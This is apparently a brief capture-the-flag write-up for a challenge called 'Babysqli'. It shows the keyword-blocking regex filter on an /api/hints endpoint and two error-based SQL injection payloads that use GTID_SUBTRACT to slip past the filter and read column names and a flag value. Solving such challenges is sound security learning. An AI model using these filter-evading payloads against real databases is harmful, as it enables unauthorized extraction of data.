# Babysqli

- Description told me, this is not the finished web server.
- As I know, the hints feature doesn't implemented yet.
- But there were two backend api path.
    - /api/captcha
    - /api/hints
- /api/hints has a error based sqli vulnerability, but there were so many filters.

```javascript
function checkHint (hint) {
  return ! / |;|\+|-|\*|\/|<|>|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`|gtid_subset|hash|json|st\_|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|sleep|benchmark/ig.test(hint)
}
```

- Also there was a length limit. (<140)
- It was hard to exploit :(


## Payload

```
'or(select(GTID_SUBTRACT((select(group_concat(column_name))from(information_schema.columns)where(mid(table_name,true,true)='V')),true)))#
'or(select(GTID_SUBTRACT((select(ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO)from(vhEFfFlLlLaAAaaggIiIIsSSHeReEE)),true)))#
```
